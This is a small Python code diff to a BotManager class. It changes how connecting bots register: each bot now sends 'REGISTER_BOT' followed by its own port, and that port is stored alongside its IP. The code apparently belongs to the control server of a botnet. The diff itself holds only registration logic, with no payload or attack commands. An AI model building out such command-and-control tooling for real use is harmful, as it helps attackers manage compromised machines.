@@ -26,7 +26,7 @@ class BotManager:
             for ip, port in self.bots:
                 f.write(f"{ip}:{port}\n")
 
-    def register_bot(self, ip, port='65440'):
+    def register_bot(self, ip, port):
         with self.lock:
             if (ip, port) not in self.bots:
                 self.bots.append((ip, port))
@@ -49,9 +49,12 @@ class BotManager:
         with conn:
             try:
                 data = conn.recv(1024).decode().strip()
-                if data == 'REGISTER_BOT':
-                    self.register_bot(addr[0])
-                    print(f"[+] Bot registered: {addr[0]}")
+                if data.startswith('REGISTER_BOT'):
+                    parts = data.split()
+                    if len(parts) == 2:
+                        port = parts[1]
+                        self.register_bot(addr[0], port)
+                        print(f"[+] Bot registrado: {addr[0]}:{port}")
             except Exception as e:
                 print(f"[!] Error handling bot connection: {e}")
 
